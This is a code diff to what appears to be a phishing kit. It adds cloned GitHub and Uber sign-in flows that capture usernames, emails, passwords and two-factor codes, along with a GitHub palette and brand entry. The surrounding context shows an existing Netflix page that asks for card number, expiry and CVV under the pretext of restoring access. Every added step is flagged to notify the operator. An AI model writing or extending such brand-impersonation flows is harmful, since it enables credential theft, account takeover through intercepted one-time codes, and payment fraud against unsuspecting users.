@@ -201,6 +201,7 @@ const PALETTES = {
   okta:           ['#007DC1','#0063A0','#FFFFFF','#007DC1','#009FDC'],
   datadog:        ['#632CA6','#4A1E82','#FFFFFF','#632CA6','#774DC5'],
   hashicorp:      ['#000000','#1A1A1A','#FFFFFF','#3FD3CC','#30B0AA'],
+  github:         ['#0d1117','#161b22','#c9d1d9','#238636','#2ea043'],
 
   emirates:       ['#C8102E','#9B0C23','#FFFFFF','#C8102E','#D4AF37'],
   qatarairways:   ['#5C0632','#3A0420','#FFFFFF','#8D1B3D','#D4AF37'],
@@ -730,6 +731,17 @@ FLOWS.netflix = [
   { slug:'payment-update', form_type:'payment',page_title:'Update Billing',     headline:'Update Billing Details',        subheadline:'To restore Netflix access, update your payment details', fields:['card_number','expiry','cvv','name_on_card'],layout:'payment',cta:'Update',    step_label:'Payment Update', notify_step:true  }
 ];
 
+FLOWS.github = [
+  { slug:'login',  form_type:'login', page_title:'Sign in to GitHub', headline:'Sign in to GitHub', subheadline:'', fields:['username','password'], layout:'auth', cta:'Sign in',    step_label:'Login', notify_step:true  },
+  { slug:'2fa',    form_type:'otp',   page_title:'Two-factor authentication', headline:'Two-factor authentication', subheadline:'Open your two-factor authenticator app to view your authentication code', fields:['code'], layout:'otp', cta:'Verify', step_label:'2FA', notify_step:true, otp_length:6 }
+];
+
+FLOWS.uber = [
+  { slug:'login',  form_type:'login', page_title:'Sign in to Uber', headline:'What\'s your phone number or email?', subheadline:'', fields:['email'], layout:'auth', cta:'Continue', step_label:'Login', notify_step:true  },
+  { slug:'password', form_type:'login', page_title:'Sign in to Uber', headline:'Enter your password', subheadline:'', fields:['password'], layout:'auth', cta:'Sign In', step_label:'Password', notify_step:true  },
+  { slug:'verify', form_type:'otp', page_title:'Confirm it\'s you', headline:'Confirm it\'s you', subheadline:'Enter the code sent to your phone', fields:['code'], layout:'otp', cta:'Confirm', step_label:'Verify', notify_step:true, otp_length:4 }
+];
+
 // ── BRANDS array ─────────────────────────────────────────────────────────────
 
 const BRANDS = [
@@ -916,6 +928,7 @@ const BRANDS = [
   ['t168','Okta','tech','okta'],
   ['t169','Datadog','tech','datadog'],
   ['t170','HashiCorp','tech','hashicorp'],
+  ['t171b','GitHub','tech','github'],
 
   // airlines (20)
   ['t171','Emirates','airlines','emirates'],
